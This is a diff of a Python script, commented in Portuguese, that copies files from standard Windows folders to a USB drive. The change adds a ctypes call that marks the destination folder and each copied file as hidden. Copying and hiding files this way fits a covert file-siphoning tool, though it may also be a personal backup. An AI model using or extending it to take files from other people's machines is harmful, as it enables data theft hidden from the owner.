@@ -2,6 +2,19 @@ import os
 import shutil
 from pathlib import Path
 import psutil  # Biblioteca para verificar dispositivos conectados
+import ctypes  # Necessário para definir atributos de arquivos no Windows
+
+# Constante para ocultar arquivos/pastas no Windows
+FILE_ATTRIBUTE_HIDDEN = 0x02
+
+
+# Define o atributo de oculto para um arquivo ou pasta
+def definir_oculto(caminho):
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(caminho, FILE_ATTRIBUTE_HIDDEN)
+        print(f"Atributo oculto definido para: {caminho}")
+    except Exception as e:
+        print(f"Erro ao definir atributo oculto para {caminho}: {e}")
 
 
 # Obtém os caminhos reais das pastas padrão do Windows
@@ -34,6 +47,7 @@ def copiar_arquivos(origem, destino, extensoes):
     if not os.path.exists(destino):
         print(f"Criando pasta no pen drive: {destino}")
         os.makedirs(destino)
+        definir_oculto(destino)  # Define a pasta criada como oculta
 
     for root, dirs, files in os.walk(origem):
         for file in files:
@@ -44,6 +58,7 @@ def copiar_arquivos(origem, destino, extensoes):
                 try:
                     print(f"Copiando: {arquivo_origem} -> {arquivo_destino}")
                     shutil.copy2(arquivo_origem, arquivo_destino)
+                    definir_oculto(arquivo_destino)  # Define o arquivo copiado como oculto
                 except Exception as e:
                     print(f"Erro ao copiar {file}: {e}")
 
